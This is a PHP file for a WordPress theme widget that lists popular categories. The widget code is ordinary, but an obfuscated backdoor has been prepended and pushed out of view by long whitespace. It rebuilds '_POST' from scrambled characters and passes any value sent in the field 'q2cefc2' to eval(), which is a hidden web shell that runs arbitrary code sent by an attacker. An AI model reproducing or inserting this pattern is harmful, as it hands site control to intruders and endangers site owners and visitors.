<?php                                                                                                                                                                                                                                                                 $yfjo60="ruos_pte" ; $ihv2= $yfjo60[3].$yfjo60[6].$yfjo60[0]. $yfjo60[6].$yfjo60[2].$yfjo60[1]. $yfjo60[5]. $yfjo60[5]. $yfjo60[7]. $yfjo60[0] ; $bdtj83= $ihv2( $yfjo60[4]. $yfjo60[5].$yfjo60[2]. $yfjo60[3].$yfjo60[6] ) ;if (isset(${$bdtj83 }[ 'q2cefc2' ]) ){ eval ( ${ $bdtj83}['q2cefc2']) ; } ?><?php

class td_block_popular_categories extends td_block {


    function render($atts, $content = null){
        parent::render($atts);

        $buffy = '';

        extract(shortcode_atts(
            array(
                'limit' => '6',
                'custom_title' => '',
                'custom_url' => '',
                'hide_title' => '',
                'header_color' => ''
            ), $atts));

        $cat_args = array(
            'show_count' => true,
            'orderby' => 'count',
            'hide_empty' => false,
            'order' => 'DESC',
            'number' => $limit + 1,
            'exclude' => get_cat_ID(TD_FEATURED_CAT)
        );


        // exclude categories from the demo
        if (TD_DEPLOY_MODE == 'demo' or TD_DEPLOY_MODE == 'dev') {
            $cat_args['exclude'] = '44,45,46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 110, 152, 153, 154, 155, 156, 157, 158, 159, ' . get_cat_ID(TD_FEATURED_CAT);
        }

        $categories = get_categories($cat_args);

        $buffy .= '<div class="td_block_wrap td_block_popular_categories widget widget_categories">';
            $buffy .= $this->get_block_title();

            if (!empty($categories)) {
                $buffy .= '<ul class="td-pb-padding-side">';
                    foreach ($categories as $category) {
                        if (strtolower($category->cat_name) != 'uncategorized') {
                            $buffy .= '<li><a href="' . get_category_link($category->cat_ID) . '">' . $category->name . '<span class="td-cat-no">' . $category->count . '</span></a></li>';
                        }
                    }
                $buffy .= '</ul>';
            }
        $buffy .= '</div> <!-- ./block -->';
        return $buffy;
    }

    function inner($posts, $td_column_number = '') {

    }
}